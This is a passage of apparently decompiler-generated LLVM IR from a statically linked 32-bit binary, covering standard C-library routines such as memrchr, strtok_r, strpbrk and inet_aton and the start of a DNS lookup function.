  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056558, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805655c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_805656f = inttoptr i32 %arg1 to i16*
  %v4_805656f = call i32 @memcpy(i16* %v3_805656f, i32 %arg2, i32 %arg3)
  %v0_8056577 = load i32, i32* @esi, align 4
  %v2_8056577 = add i32 %v0_8056577, %arg3
  store i32 %v0_805655c, i32* @esi, align 4
  ret i32 %v2_8056577
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8056585 = urem i32 %arg2, 256
  %v4_8056591 = sext i8 %arg1 to i32
  %v2_8056595 = add i32 %v4_8056591, %arg3
  %v1_80565a76 = icmp eq i32 %arg3, 0
  br i1 %v1_80565a76, label %dec_label_pc_80565af, label %dec_label_pc_80565ab

dec_label_pc_8056599:                             ; preds = %dec_label_pc_80565ab
  %v1_8056599 = add i32 %v0_8056599, -1
  %v5_805659a = load i32, i32* @edx, align 4
  %v6_805659a = and i32 %v5_805659a, -256
  %v7_805659a = or i32 %v6_805659a, %v4_8056585
  store i32 %v7_805659a, i32* @edx, align 4
  %v1_805659e = inttoptr i32 %v1_8056599 to i8*
  %v2_805659e = load i8, i8* %v1_805659e, align 1
  %v15_805659e = icmp eq i8 %v2_805659e, %tmp
  br i1 %v15_805659e, label %dec_label_pc_805662c, label %dec_label_pc_80565a6

dec_label_pc_80565a6:                             ; preds = %dec_label_pc_8056599
  %v1_80565a6 = add i32 %v0_80565a6, -1
  %v8_80565a6 = icmp eq i32 %v1_80565a6, 0
  br i1 %v8_80565a6, label %dec_label_pc_80565af, label %dec_label_pc_80565ab

dec_label_pc_80565ab:                             ; preds = %entry, %dec_label_pc_80565a6
  %v0_80565a6 = phi i32 [ %v1_80565a6, %dec_label_pc_80565a6 ], [ %arg3, %entry ]
  %v0_8056599 = phi i32 [ %v1_8056599, %dec_label_pc_80565a6 ], [ %v2_8056595, %entry ]
  %v2_80565ab = urem i32 %v0_8056599, 4
  %v3_80565ab = icmp eq i32 %v2_80565ab, 0
  %v1_80565ad = icmp eq i1 %v3_80565ab, false
  br i1 %v1_80565ad, label %dec_label_pc_8056599, label %dec_label_pc_80565af

dec_label_pc_80565af:                             ; preds = %dec_label_pc_80565a6, %dec_label_pc_80565ab, %entry
  %v0_8056612.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80565a6 ], [ %v0_80565a6, %dec_label_pc_80565ab ]
  %v0_80565b4 = phi i32 [ %v2_8056595, %entry ], [ %v1_8056599, %dec_label_pc_80565a6 ], [ %v0_8056599, %dec_label_pc_80565ab ]
  store i32 %v0_80565b4, i32* @ecx, align 4
  %v2_80565b8 = mul nuw nsw i32 %v4_8056585, 256
  %v2_80565bb = or i32 %v2_80565b8, %v4_8056585
  %v2_80565bf = mul i32 %v2_80565bb, 65536
  %v2_80565c2 = or i32 %v2_80565bf, %v2_80565bb
  %v6_805661554 = icmp ugt i32 %v0_8056612.pr, 3
  br i1 %v6_805661554, label %dec_label_pc_80565c6, label %dec_label_pc_8056617

dec_label_pc_80565c6:                             ; preds = %dec_label_pc_80565af, %dec_label_pc_805660f
  %v0_805660f56 = phi i32 [ %v1_805660f, %dec_label_pc_805660f ], [ %v0_8056612.pr, %dec_label_pc_80565af ]
  %v0_80565c655 = phi i32 [ %v1_80565c6, %dec_label_pc_805660f ], [ %v0_80565b4, %dec_label_pc_80565af ]
  %v1_80565c6 = add i32 %v0_80565c655, -4
  store i32 %v1_80565c6, i32* @ecx, align 4
  %v2_80565cb = inttoptr i32 %v1_80565c6 to i32*
  %v3_80565cb = load i32, i32* %v2_80565cb, align 4
  %v4_80565cb = xor i32 %v3_80565cb, %v2_80565c2
  %v1_80565cd = add i32 %v4_80565cb, 2130640639
  %v1_80565d3 = sub i32 -1, %v4_80565cb
  %v2_80565d5 = xor i32 %v1_80565cd, %v1_80565d3
  %v1_80565d7 = and i32 %v2_80565d5, -2130640640
  %v2_80565d7 = icmp eq i32 %v1_80565d7, 0
  br i1 %v2_80565d7, label %dec_label_pc_805660f, label %dec_label_pc_80565df

dec_label_pc_80565df:                             ; preds = %dec_label_pc_80565c6
  %v7_80565df = or i32 %v1_80565d7, %v4_8056585
  %v1_80565e3 = add i32 %v0_80565c655, -1
  %v2_80565e6 = inttoptr i32 %v1_80565e3 to i8*
  %v3_80565e6 = load i8, i8* %v2_80565e6, align 1
  %v16_80565e6 = icmp eq i8 %v3_80565e6, %tmp
  br i1 %v16_80565e6, label %dec_label_pc_805662c, label %dec_label_pc_80565eb

dec_label_pc_80565eb:                             ; preds = %dec_label_pc_80565df
  %v1_80565ef = add i32 %v0_80565c655, -2
  %v2_80565f2 = inttoptr i32 %v1_80565ef to i8*
  %v3_80565f2 = load i8, i8* %v2_80565f2, align 1
  %v16_80565f2 = icmp eq i8 %v3_80565f2, %tmp
  br i1 %v16_80565f2, label %dec_label_pc_805662c, label %dec_label_pc_80565f7

dec_label_pc_80565f7:                             ; preds = %dec_label_pc_80565eb
  %v1_80565fb = add i32 %v0_80565c655, -3
  %v2_80565fe = inttoptr i32 %v1_80565fb to i8*
  %v3_80565fe = load i8, i8* %v2_80565fe, align 1
  %v16_80565fe = icmp eq i8 %v3_80565fe, %tmp
  br i1 %v16_80565fe, label %dec_label_pc_805662c, label %dec_label_pc_8056603

dec_label_pc_8056603:                             ; preds = %dec_label_pc_80565f7
  %v1_8056607 = inttoptr i32 %v1_80565c6 to i8*
  %v2_8056607 = load i8, i8* %v1_8056607, align 1
  %v15_8056607 = icmp eq i8 %v2_8056607, %tmp
  %v1_8056609 = icmp eq i1 %v15_8056607, false
  br i1 %v1_8056609, label %dec_label_pc_805660f, label %dec_label_pc_805660b

dec_label_pc_805660b:                             ; preds = %dec_label_pc_8056603
  br label %dec_label_pc_805662c

dec_label_pc_805660f:                             ; preds = %dec_label_pc_8056603, %dec_label_pc_80565c6
  %v5_805661c26 = phi i32 [ %v7_80565df, %dec_label_pc_8056603 ], [ 0, %dec_label_pc_80565c6 ]
  %v1_805660f = add i32 %v0_805660f56, -4
  %v6_8056615 = icmp ugt i32 %v1_805660f, 3
  br i1 %v6_8056615, label %dec_label_pc_80565c6, label %dec_label_pc_8056617

dec_label_pc_8056617:                             ; preds = %dec_label_pc_805660f, %dec_label_pc_80565af
  %v5_805661c25.lcssa = phi i32 [ %v4_8056585, %dec_label_pc_80565af ], [ %v5_805661c26, %dec_label_pc_805660f ]
  %v0_80565c6.lcssa = phi i32 [ %v0_80565b4, %dec_label_pc_80565af ], [ %v1_80565c6, %dec_label_pc_805660f ]
  %v0_805660f.lcssa = phi i32 [ %v0_8056612.pr, %dec_label_pc_80565af ], [ %v1_805660f, %dec_label_pc_805660f ]
  br label %dec_label_pc_8056624

dec_label_pc_805661b:                             ; preds = %dec_label_pc_8056624
  %v1_8056624 = add i32 %v0_8056624, -1
  %v1_805661b = add i32 %v0_805661b, -1
  %v6_805661c = and i32 %v5_805661c, -256
  %v7_805661c = or i32 %v6_805661c, %v4_8056585
  %v1_8056620 = inttoptr i32 %v1_805661b to i8*
  %v2_8056620 = load i8, i8* %v1_8056620, align 1
  %v15_8056620 = icmp eq i8 %v2_8056620, %tmp
  br i1 %v15_8056620, label %dec_label_pc_805662c, label %dec_label_pc_8056624

dec_label_pc_8056624:                             ; preds = %dec_label_pc_805661b, %dec_label_pc_8056617
  %v5_805661c = phi i32 [ %v7_805661c, %dec_label_pc_805661b ], [ %v5_805661c25.lcssa, %dec_label_pc_8056617 ]
  %v0_805661b = phi i32 [ %v1_805661b, %dec_label_pc_805661b ], [ %v0_80565c6.lcssa, %dec_label_pc_8056617 ]
  %v0_8056624 = phi i32 [ %v1_8056624, %dec_label_pc_805661b ], [ %v0_805660f.lcssa, %dec_label_pc_8056617 ]
  %v10_8056625 = icmp eq i32 %v0_8056624, 0
  %v1_8056628 = icmp eq i1 %v10_8056625, false
  br i1 %v1_8056628, label %dec_label_pc_805661b, label %dec_label_pc_805662a

dec_label_pc_805662a:                             ; preds = %dec_label_pc_8056624
  br label %dec_label_pc_805662c

dec_label_pc_805662c:                             ; preds = %dec_label_pc_8056599, %dec_label_pc_80565f7, %dec_label_pc_80565eb, %dec_label_pc_80565df, %dec_label_pc_805661b, %dec_label_pc_805660b, %dec_label_pc_805662a
  %v0_805662f = phi i32 [ %v1_80565c6, %dec_label_pc_805660b ], [ 0, %dec_label_pc_805662a ], [ %v1_805661b, %dec_label_pc_805661b ], [ %v1_80565fb, %dec_label_pc_80565f7 ], [ %v1_80565ef, %dec_label_pc_80565eb ], [ %v1_80565e3, %dec_label_pc_80565df ], [ %v1_8056599, %dec_label_pc_8056599 ]
  ret i32 %v0_805662f

; uselistorder directives
  uselistorder i32 %v0_8056624, { 1, 0 }
  uselistorder i32 %v1_805660f, { 0, 2, 1 }
  uselistorder i32 %v1_80565c6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_80565c655, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80565bb, { 1, 0 }
  uselistorder i32 %v0_8056599, { 1, 0, 2 }
  uselistorder i32 %v2_8056595, { 1, 0 }
  uselistorder i32 %v4_8056585, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805662c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80565c6, { 1, 0 }
  uselistorder label %dec_label_pc_80565af, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80565ab, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056630 = load i32, i32* @edi, align 4
  %v0_8056631 = load i32, i32* @esi, align 4
  %v0_8056632 = load i32, i32* @ebx, align 4
  store i32 %v0_8056632, i32* %stack_var_-12, align 4
  %v4_8056633 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056633, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805663f = icmp eq i8* %arg1, null
  %v1_8056641 = icmp eq i1 %v1_805663f, false
  br i1 %v1_8056641, label %dec_label_pc_8056645, label %dec_label_pc_8056643

dec_label_pc_8056643:                             ; preds = %entry
  %v1_8056643 = inttoptr i32 %arg3 to i32*
  %v2_8056643 = load i32, i32* %v1_8056643, align 4
  store i32 %v2_8056643, i32* @ebx, align 4
  br label %dec_label_pc_8056645

dec_label_pc_8056645:                             ; preds = %entry, %dec_label_pc_8056643
  %v0_8056648 = phi i32 [ %v4_8056633, %entry ], [ %v2_8056643, %dec_label_pc_8056643 ]
  %v0_8056645 = load i32, i32* @ecx, align 4
  %v5_8056648 = inttoptr i32 %v0_8056648 to i8*
  %v8_8056649 = call i32 @__GI_strspn(i8* %v5_8056648, i32 %arg2, i32 %v0_8056645, i32 %v0_8056645)
  store i32 %v8_8056649, i32* %eax.global-to-local, align 4
  %v0_8056651 = load i32, i32* @ebx, align 4
  %v2_8056651 = add i32 %v0_8056651, %v8_8056649
  store i32 %v2_8056651, i32* @ebx, align 4
  %v1_8056653 = inttoptr i32 %v2_8056651 to i8*
  %v2_8056653 = load i8, i8* %v1_8056653, align 1
  %v3_8056653 = icmp eq i8 %v2_8056653, 0
  %v1_8056656 = icmp eq i1 %v3_8056653, false
  br i1 %v1_8056656, label %dec_label_pc_805665e, label %dec_label_pc_8056658

dec_label_pc_8056658:                             ; preds = %dec_label_pc_8056645
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805665a = load i32, i32* @esi, align 4
  %v2_805665a = inttoptr i32 %v1_805665a to i32*
  store i32 %v2_8056651, i32* %v2_805665a, align 4
  %v0_8056688.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056685

dec_label_pc_805665e:                             ; preds = %dec_label_pc_8056645
  %v0_805665e = load i32, i32* @edx, align 4
  %v0_8056660 = load i32, i32* @edi, align 4
  %v8_8056662 = call i32 @__GI_strpbrk(i8* %v1_8056653, i32 %v0_8056660, i32 %v0_805665e, i32 %v0_805665e)
  store i32 %v8_8056662, i32* %eax.global-to-local, align 4
  %v2_805666a = icmp eq i32 %v8_8056662, 0
  %v1_805666c = icmp eq i1 %v2_805666a, false
  br i1 %v1_805666c, label %dec_label_pc_805667d, label %dec_label_pc_805666e

dec_label_pc_805666e:                             ; preds = %dec_label_pc_805665e
  %v0_8056672 = load i32, i32* @ebx, align 4
  %v5_8056672 = inttoptr i32 %v0_8056672 to i8*
  %v8_8056673 = call i32 @rawmemchr(i8* %v5_8056672, i32 0, i32 %v8_8056662, i32 %v8_8056662)
  br label %dec_label_pc_8056681

dec_label_pc_805667d:                             ; preds = %dec_label_pc_805665e
  %v9_8056662 = inttoptr i32 %v8_8056662 to i8*
  store i8 0, i8* %v9_8056662, align 1
  %v2_8056680 = add i32 %v8_8056662, 1
  br label %dec_label_pc_8056681

dec_label_pc_8056681:                             ; preds = %dec_label_pc_805666e, %dec_label_pc_805667d
  %storemerge = phi i32 [ %v2_8056680, %dec_label_pc_805667d ], [ %v8_8056673, %dec_label_pc_805666e ]
  %v0_8056681 = phi i32 [ %v2_8056680, %dec_label_pc_805667d ], [ %v8_8056673, %dec_label_pc_805666e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8056681 = load i32, i32* @esi, align 4
  %v2_8056681 = inttoptr i32 %v1_8056681 to i32*
  store i32 %v0_8056681, i32* %v2_8056681, align 4
  %v0_8056683 = load i32, i32* @ebx, align 4
  store i32 %v0_8056683, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056685

dec_label_pc_8056685:                             ; preds = %dec_label_pc_8056658, %dec_label_pc_8056681
  %v0_8056688 = phi i32 [ %v0_8056688.pre, %dec_label_pc_8056658 ], [ %v0_8056683, %dec_label_pc_8056681 ]
  %v2_8056685 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056685, i32* @ebx, align 4
  store i32 %v0_8056631, i32* @esi, align 4
  store i32 %v0_8056630, i32* @edi, align 4
  ret i32 %v0_8056688

; uselistorder directives
  uselistorder i32 %v8_8056662, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056685, { 1, 0 }
  uselistorder label %dec_label_pc_8056681, { 1, 0 }
  uselistorder label %dec_label_pc_8056645, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805668d = load i32, i32* @ebx, align 4
  %v2_80566a426 = load i8, i8* %arg1, align 1
  %v4_80566a630 = icmp eq i8 %v2_80566a426, 0
  br i1 %v4_80566a630, label %dec_label_pc_80566ae, label %dec_label_pc_80566aa.lr.ph

dec_label_pc_80566aa.lr.ph:                       ; preds = %entry
  %v3_80566a427 = zext i8 %v2_80566a426 to i32
  %v5_80566a428 = and i32 %v0_805668d, -256
  %v6_80566a429 = or i32 %v3_80566a427, %v5_80566a428
  %v4_8056692 = ptrtoint i8* %arg1 to i32
  %v1_805669d14 = inttoptr i32 %arg2 to i8*
  %v4_805669d.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80566aa

dec_label_pc_8056698:                             ; preds = %dec_label_pc_80566aa, %dec_label_pc_805669c
  %v6_805669d24 = phi i32 [ %v6_805669d, %dec_label_pc_805669c ], [ %v6_805669d18, %dec_label_pc_80566aa ]
  %v2_805669d23 = phi i8 [ %v2_805669d, %dec_label_pc_805669c ], [ %v2_805669d15, %dec_label_pc_80566aa ]
  %v0_805669c22 = phi i32 [ %v1_805669c, %dec_label_pc_805669c ], [ %arg2, %dec_label_pc_80566aa ]
  %v15_8056698 = icmp eq i8 %v2_805669d23, %v2_80566a434
  br i1 %v15_8056698, label %dec_label_pc_80566b0, label %dec_label_pc_805669c

dec_label_pc_805669c:                             ; preds = %dec_label_pc_8056698
  %v1_805669c = add i32 %v0_805669c22, 1
  store i32 %v1_805669c, i32* @edx, align 4
  %v1_805669d = inttoptr i32 %v1_805669c to i8*
  %v2_805669d = load i8, i8* %v1_805669d, align 1
  %v3_805669d = zext i8 %v2_805669d to i32
  %v5_805669d = and i32 %v6_805669d24, -256
  %v6_805669d = or i32 %v3_805669d, %v5_805669d
  store i32 %v6_805669d, i32* @ecx, align 4
  %v4_805669f = icmp eq i8 %v2_805669d, 0
  %v1_80566a1 = icmp eq i1 %v4_805669f, false
  br i1 %v1_80566a1, label %dec_label_pc_8056698, label %dec_label_pc_80566a3

dec_label_pc_80566a3:                             ; preds = %dec_label_pc_805669c, %dec_label_pc_80566aa
  %v4_805669d.pre37 = phi i32 [ %v6_805669d18, %dec_label_pc_80566aa ], [ %v6_805669d, %dec_label_pc_805669c ]
  %v1_80566a3 = add i32 %v0_80566a332, 1
  %v1_80566a4 = inttoptr i32 %v1_80566a3 to i8*
  %v2_80566a4 = load i8, i8* %v1_80566a4, align 1
  %v3_80566a4 = zext i8 %v2_80566a4 to i32
  %v5_80566a4 = and i32 %v6_80566a435, -256
  %v6_80566a4 = or i32 %v3_80566a4, %v5_80566a4
  %v4_80566a6 = icmp eq i8 %v2_80566a4, 0
  br i1 %v4_80566a6, label %dec_label_pc_80566ae, label %dec_label_pc_80566aa

dec_label_pc_80566aa:                             ; preds = %dec_label_pc_80566aa.lr.ph, %dec_label_pc_80566a3
  %v4_805669d.pre = phi i32 [ %v4_805669d.pre.pre, %dec_label_pc_80566aa.lr.ph ], [ %v4_805669d.pre37, %dec_label_pc_80566a3 ]
  %v6_80566a435 = phi i32 [ %v6_80566a429, %dec_label_pc_80566aa.lr.ph ], [ %v6_80566a4, %dec_label_pc_80566a3 ]
  %v2_80566a434 = phi i8 [ %v2_80566a426, %dec_label_pc_80566aa.lr.ph ], [ %v2_80566a4, %dec_label_pc_80566a3 ]
  %v0_80566a332 = phi i32 [ %v4_8056692, %dec_label_pc_80566aa.lr.ph ], [ %v1_80566a3, %dec_label_pc_80566a3 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805669d15 = load i8, i8* %v1_805669d14, align 1
  %v3_805669d16 = zext i8 %v2_805669d15 to i32
  %v5_805669d17 = and i32 %v4_805669d.pre, -256
  %v6_805669d18 = or i32 %v3_805669d16, %v5_805669d17
  store i32 %v6_805669d18, i32* @ecx, align 4
  %v4_805669f19 = icmp eq i8 %v2_805669d15, 0
  %v1_80566a121 = icmp eq i1 %v4_805669f19, false
  br i1 %v1_80566a121, label %dec_label_pc_8056698, label %dec_label_pc_80566a3

dec_label_pc_80566ae:                             ; preds = %dec_label_pc_80566a3, %entry
  br label %dec_label_pc_80566b0

dec_label_pc_80566b0:                             ; preds = %dec_label_pc_8056698, %dec_label_pc_80566ae
  %v0_80566b2 = phi i32 [ 0, %dec_label_pc_80566ae ], [ %v0_80566a332, %dec_label_pc_8056698 ]
  store i32 %v0_805668d, i32* @ebx, align 4
  ret i32 %v0_80566b2

; uselistorder directives
  uselistorder i32 %v6_805669d18, { 2, 0, 1 }
  uselistorder i8 %v2_805669d15, { 1, 2, 0 }
  uselistorder i32 %v1_80566a3, { 1, 0 }
  uselistorder i32 %v6_805669d, { 1, 2, 0 }
  uselistorder i8 %v2_805669d, { 1, 2, 0 }
  uselistorder i32 %v1_805669c, { 2, 1, 0 }
  uselistorder i8 %v2_80566a426, { 0, 2, 1 }
  uselistorder i32 %v0_805668d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80566b0, { 1, 0 }
  uselistorder label %dec_label_pc_80566aa, { 1, 0 }
  uselistorder label %dec_label_pc_80566a3, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80566bb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80566bb, i32* @ecx, align 4
  %v1_80566bf = icmp eq i8* %arg1, null
  br i1 %v1_80566bf, label %dec_label_pc_8056740, label %dec_label_pc_80566c3

dec_label_pc_80566c3:                             ; preds = %entry
  %v0_80566ce.pre = load i32, i32* @global_var_805f23c, align 4
  br label %dec_label_pc_80566ce

dec_label_pc_80566ce:                             ; preds = %dec_label_pc_80566c3, %dec_label_pc_8056717
  %v2_805671734 = phi i32 [ 1, %dec_label_pc_80566c3 ], [ %v3_8056717, %dec_label_pc_8056717 ]
  %v0_80566d433 = phi i32 [ %v4_80566bb, %dec_label_pc_80566c3 ], [ %v0_80566d43, %dec_label_pc_8056717 ]
  %v0_805673532 = phi i32 [ 0, %dec_label_pc_80566c3 ], [ %v2_805671d, %dec_label_pc_8056717 ]
  %v1_80566d4 = inttoptr i32 %v0_80566d433 to i8*
  %v2_80566d4 = load i8, i8* %v1_80566d4, align 1
  %v3_80566d4 = sext i8 %v2_80566d4 to i32
  %v2_80566d7 = mul nsw i32 %v3_80566d4, 2
  %v3_80566d7 = add i32 %v2_80566d7, %v0_80566ce.pre
  %v4_80566d7 = inttoptr i32 %v3_80566d7 to i8*
  %v5_80566d7 = load i8, i8* %v4_80566d7, align 1
  %v6_80566d7 = and i8 %v5_80566d7, 8
  %v7_80566d7 = icmp eq i8 %v6_80566d7, 0
  br i1 %v7_80566d7, label %dec_label_pc_8056740, label %dec_label_pc_80566de

dec_label_pc_80566de:                             ; preds = %dec_label_pc_80566ce
  %v4_80566f2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80566f2

dec_label_pc_80566e2:                             ; preds = %dec_label_pc_80566f2
  %v3_80566e2 = mul i32 %v1_80566e2, 10
  %v2_80566e5 = add i32 %v3_80566e2, -48
  %v3_80566e5 = add i32 %v2_80566e5, %v2_80566f4
  %v1_80566e9 = add i32 %v3_80566e5, -255
  %v6_80566e9 = sub i32 254, %v3_80566e5
  %v7_80566e9 = and i32 %v6_80566e9, %v3_80566e5
  %v8_80566e9 = icmp slt i32 %v7_80566e9, 0
  %v9_80566e9 = icmp eq i32 %v1_80566e9, 0
  %v10_80566e9 = icmp slt i32 %v1_80566e9, 0
  %v3_80566ef = icmp eq i1 %v10_80566e9, %v8_80566e9
  %v4_80566ef = icmp eq i1 %v9_80566e9, false
  %v5_80566ef = and i1 %v4_80566ef, %v3_80566ef
  br i1 %v5_80566ef, label %dec_label_pc_8056740, label %dec_label_pc_80566f1

dec_label_pc_80566f1:                             ; preds = %dec_label_pc_80566e2
  %v1_80566f1 = add i32 %v0_80566f1, 1
  store i32 %v1_80566f1, i32* @ecx, align 4
  br label %dec_label_pc_80566f2

dec_label_pc_80566f2:                             ; preds = %dec_label_pc_80566de, %dec_label_pc_80566f1
  %v1_80566e2 = phi i32 [ 0, %dec_label_pc_80566de ], [ %v3_80566e5, %dec_label_pc_80566f1 ]
  %v4_80566f2 = phi i32 [ %v4_80566f2.pre, %dec_label_pc_80566de ], [ %v6_80566f2, %dec_label_pc_80566f1 ]
  %v0_80566f1 = phi i32 [ %v0_80566d433, %dec_label_pc_80566de ], [ %v1_80566f1, %dec_label_pc_80566f1 ]
  %v1_80566f2 = inttoptr i32 %v0_80566f1 to i8*
  %v2_80566f2 = load i8, i8* %v1_80566f2, align 1
  %v3_80566f2 = zext i8 %v2_80566f2 to i32
  %v5_80566f2 = and i32 %v4_80566f2, -256
  %v6_80566f2 = or i32 %v3_80566f2, %v5_80566f2
  store i32 %v6_80566f2, i32* @edx, align 4
  %v2_80566f4 = sext i8 %v2_80566f2 to i32
  %v2_80566f7 = mul nsw i32 %v2_80566f4, 2
  %v3_80566f7 = add i32 %v2_80566f7, %v0_80566ce.pre
  %v4_80566f7 = inttoptr i32 %v3_80566f7 to i16*
  %v5_80566f7 = load i16, i16* %v4_80566f7, align 2
  %v2_80566fc = and i16 %v5_80566f7, 8
  %v3_80566fc = icmp eq i16 %v2_80566fc, 0
  %v1_80566fe = icmp eq i1 %v3_80566fc, false
  br i1 %v1_80566fe, label %dec_label_pc_80566e2, label %dec_label_pc_8056700

dec_label_pc_8056700:                             ; preds = %dec_label_pc_80566f2
  %v8_8056700 = sub nsw i32 2, %v2_805671734
  %v9_8056700 = and i32 %v8_8056700, %v2_805671734
  %v10_8056700 = icmp slt i32 %v9_8056700, 0
  %v11_8056700 = icmp eq i32 %v2_805671734, 3
  %v12_8056700 = icmp slt i32 %v2_805671734, 3
  %v3_8056704 = icmp eq i1 %v12_8056700, %v10_8056700
  %v4_8056704 = icmp eq i1 %v11_8056700, false
  %v5_8056704 = and i1 %v4_8056704, %v3_8056704
  br i1 %v5_8056704, label %dec_label_pc_805670e, label %dec_label_pc_8056706

dec_label_pc_8056706:                             ; preds = %dec_label_pc_8056700
  %v10_8056706 = icmp eq i8 %v2_80566f2, 46
  %v1_8056709 = icmp eq i1 %v10_8056706, false
  br i1 %v1_8056709, label %dec_label_pc_8056740, label %dec_label_pc_805670b

dec_label_pc_805670b:                             ; preds = %dec_label_pc_8056706
  %v1_805670b = add i32 %v0_80566f1, 1
  store i32 %v1_805670b, i32* @ecx, align 4
  br label %dec_label_pc_8056717

dec_label_pc_805670e:                             ; preds = %dec_label_pc_8056700
  %v1_805670e = add i32 %v0_80566f1, 1
  store i32 %v1_805670e, i32* @ecx, align 4
  %v4_805670f = icmp eq i8 %v2_80566f2, 0
  br i1 %v4_805670f, label %dec_label_pc_8056717, label %dec_label_pc_8056713

dec_label_pc_8056713:                             ; preds = %dec_label_pc_805670e
  %v2_8056713 = and i16 %v5_80566f7, 32
  %v3_8056713 = icmp eq i16 %v2_8056713, 0
  br i1 %v3_8056713, label %dec_label_pc_8056740, label %dec_label_pc_8056717

dec_label_pc_8056717:                             ; preds = %dec_label_pc_8056713, %dec_label_pc_805670e, %dec_label_pc_805670b
  %v0_80566d43 = phi i32 [ %v1_805670e, %dec_label_pc_8056713 ], [ %v1_805670e, %dec_label_pc_805670e ], [ %v1_805670b, %dec_label_pc_805670b ]
  %v3_8056717 = add nuw nsw i32 %v2_805671734, 1
  %v2_805671a = mul i32 %v0_805673532, 256
  %v2_805671d = or i32 %v1_80566e2, %v2_805671a
  %v7_8056723 = icmp sgt i32 %v2_805671734, 3
  br i1 %v7_8056723, label %dec_label_pc_8056725, label %dec_label_pc_80566ce

dec_label_pc_8056725:                             ; preds = %dec_label_pc_8056717
  %v4_8056725 = icmp eq i32 %arg2, 0
  br i1 %v4_8056725, label %dec_label_pc_8056742, label %dec_label_pc_8056731

dec_label_pc_8056731:                             ; preds = %dec_label_pc_8056725
  %v1_8056735 = call i32 @llvm.bswap.i32(i32 %v2_805671d)
  %v2_8056737 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8056735, i32* %v2_8056737, align 4
  br label %dec_label_pc_8056742

dec_label_pc_8056740:                             ; preds = %dec_label_pc_8056713, %dec_label_pc_8056706, %dec_label_pc_80566ce, %dec_label_pc_80566e2, %entry
  br label %dec_label_pc_8056742

dec_label_pc_8056742:                             ; preds = %dec_label_pc_8056725, %dec_label_pc_8056731, %dec_label_pc_8056740
  %v0_8056747 = phi i32 [ 1, %dec_label_pc_8056725 ], [ 1, %dec_label_pc_8056731 ], [ 0, %dec_label_pc_8056740 ]
  ret i32 %v0_8056747

; uselistorder directives
  uselistorder i32 %v2_80566f4, { 1, 0 }
  uselistorder i32 %v6_80566f2, { 1, 0 }
  uselistorder i8 %v2_80566f2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80566f1, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80566e9, { 1, 0 }
  uselistorder i32 %v3_80566e5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80566d433, { 1, 0 }
  uselistorder i32 %v2_805671734, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056742, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056740, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80566f2, { 1, 0 }
  uselistorder label %dec_label_pc_80566ce, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_805675e = call i32 @malloc(i32 512)
  store i32 %v2_805675e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_805675e, i32* @ebp, align 4
  %v2_805676c = call i32 @malloc(i32 1025)
  store i32 %v2_805676c, i32* %eax.global-to-local, align 4
  %v12_8056775 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8056778 = icmp eq i32 %v2_805675e, 0
